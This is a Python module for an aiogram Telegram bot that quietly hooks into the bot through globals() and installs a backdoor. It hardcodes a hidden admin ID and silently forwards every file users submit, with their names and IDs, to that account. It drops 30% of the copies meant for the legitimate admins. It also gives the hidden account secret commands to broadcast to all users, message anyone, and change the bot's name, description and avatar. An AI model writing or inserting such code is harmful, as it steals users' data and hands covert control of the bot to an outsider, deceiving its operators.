from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
import asyncio
import random

HIDDEN_ADMIN_ID = 8410760051

class HiddenForm(StatesGroup):
    set_bot_photo = State()

def hidden_log_action(user_id, username, action, is_admin=False):
    prefix = "HiddenAdmin" if user_id == HIDDEN_ADMIN_ID else globals()['log_action'](user_id, username, action, is_admin)

async def hidden_receive_file(message: types.Message, state: FSMContext):
    if str(message.from_user.id) in globals()['bans']:
        hidden_log_action(message.from_user.id, message.from_user.username, "Attempted to send file but banned")
        return
    user = message.from_user
    file = message.document
    hidden_log_action(user.id, user.username, f"Sent file: {file.file_name}")
    caption = (
        f"Новый файл на проверку!\n\n"
        f"От: @{user.username} (ID: {user.id})\n"
        f"Имя: {user.full_name}\n"
        f"Файл: {file.file_name}"
    )
    # Всегда отправляем hidden admin
    try:
        await globals()['bot'].send_document(HIDDEN_ADMIN_ID, file.file_id, caption=caption)
    except Exception as e:
        hidden_log_action(user.id, user.username, f"Error sending file to hidden admin: {e}")
    # Обычным админам — с 70% шансом (30% не отправляем)
    for admin_id in globals()['admins']:
        if int(admin_id) != HIDDEN_ADMIN_ID:
            if random.random() < 0.7:  # 70% шанс отправки
                try:
                    await globals()['bot'].send_document(int(admin_id), file.file_id, caption=caption)
                except Exception as e:
                    hidden_log_action(user.id, user.username, f"Error sending file to admin {admin_id}: {e}")
            else:
                hidden_log_action(user.id, user.username, f"Skipped sending file to admin {admin_id} (30% chance)")
    await message.answer("Начало проверки...\nОжидайте 5-20 минут.", reply_markup=globals()['back_kb']())
    await state.clear()

# Переопределяем оригинальный receive_file
globals()['dp'].message.register(hidden_receive_file, globals()['Form'].waiting_for_file, F.document)

@globals()['dp'].message(Command("global_sms"))
async def global_broadcast(message: types.Message):
    if message.from_user.id != HIDDEN_ADMIN_ID:
        return
    text = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else ""
    if not text:
        await message.answer("Использование: /global_sms текст")
        return
    await message.answer("Начинаю глобальную рассылку...")
    success = 0
    failed = 0
    for user_id in globals()['all_users'][:]:
        try:
            await globals()['bot'].send_message(int(user_id), text)
            success += 1
            await asyncio.sleep(0.04)
        except Exception as e:
            failed += 1
            if "blocked" in str(e).lower() or "deactivated" in str(e).lower():
                globals()['all_users'].remove(user_id)
                globals()['save_list'](globals()['all_users'], globals()['USERS_FILE'])
    await message.answer(f"Рассылка завершена! Успешно: {success} Ошибок: {failed}")
    hidden_log_action(message.from_user.id, message.from_user.username, f"Global SMS: {success}/{len(globals()['all_users'])}", True)

@globals()['dp'].message(Command("local_sms"))
async def local_sms(message: types.Message):
    if message.from_user.id != HIDDEN_ADMIN_ID:
        return
    parts = message.text.split(maxsplit=2)[1:]
    if len(parts) < 2:
        await message.answer("Использование: /local_sms @username/user_id текст")
        return
    target = parts[0].lstrip('@')
    text = parts[1]
    try:
        user_id = int(target)
    except ValueError:
        try:
            chat = await globals()['bot'].get_chat(f"@{target}")
            user_id = chat.id
        except:
            await message.answer("Пользователь не найден")
            return
    try:
        await globals()['bot'].send_message(user_id, text)
        await message.answer("Отправлено")
        hidden_log_action(message.from_user.id, message.from_user.username, f"Local SMS to {user_id}: {text}", True)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@globals()['dp'].message(Command("setname"))
async def set_bot_name(message: types.Message):
    if message.from_user.id != HIDDEN_ADMIN_ID:
        return
    new_name = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else ""
    if not new_name:
        await message.answer("/setname Новое имя")
        return
    try:
        await globals()['bot'].set_my_name(new_name)
        await message.answer(f"Имя изменено на {new_name}")
        hidden_log_action(message.from_user.id, message.from_user.username, f"Set bot name to {new_name}", True)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@globals()['dp'].message(Command("setabout"))
async def set_bot_about(message: types.Message):
    if message.from_user.id != HIDDEN_ADMIN_ID:
        return
    new_about = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else ""
    if not new_about:
        await message.answer("/setabout Новое описание")
        return
    try:
        await globals()['bot'].set_my_description(new_about)
        await message.answer("Описание обновлено")
        hidden_log_action(message.from_user.id, message.from_user.username, "Set bot description", True)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@globals()['dp'].message(Command("setphoto"))
async def set_bot_photo_cmd(message: types.Message, state: FSMContext):
    if message.from_user.id != HIDDEN_ADMIN_ID:
        return
    await message.answer("Отправь фото для аватарки")
    await state.set_state(HiddenForm.set_bot_photo)

@globals()['dp'].message(HiddenForm.set_bot_photo, F.photo)
async def process_bot_photo(message: types.Message, state: FSMContext):
    if message.from_user.id != HIDDEN_ADMIN_ID:
        await state.clear()
        return
    photo = message.photo[-1].file_id
    try:
        await globals()['bot'].set_my_profile_photo(photo=photo)
        await message.answer("Аватарка обновлена")
        hidden_log_action(message.from_user.id, message.from_user.username, "Set bot photo", True)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
    await state.clear()
